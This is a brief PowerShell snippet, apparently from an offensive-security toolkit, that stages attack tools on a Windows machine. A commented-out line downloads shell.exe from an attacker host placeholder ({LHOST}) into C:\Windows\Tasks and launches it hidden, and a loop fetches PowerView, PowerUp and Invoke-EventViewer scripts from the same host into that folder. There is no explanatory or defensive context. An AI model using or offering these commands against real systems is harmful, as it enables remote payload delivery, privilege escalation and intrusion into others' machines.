# # # Single target
#Invoke-WebRequest -Uri http://{LHOST} -OutFile C:\Windows\Tasks\shell.exe; Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe


# # # Multi Target
$baseUrl = "http://{LHOST}/"
$fileNames = @("Invoke-EventViewer.ps1", "/powershell/powerview-dev.ps1", "powerup.ps1")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}


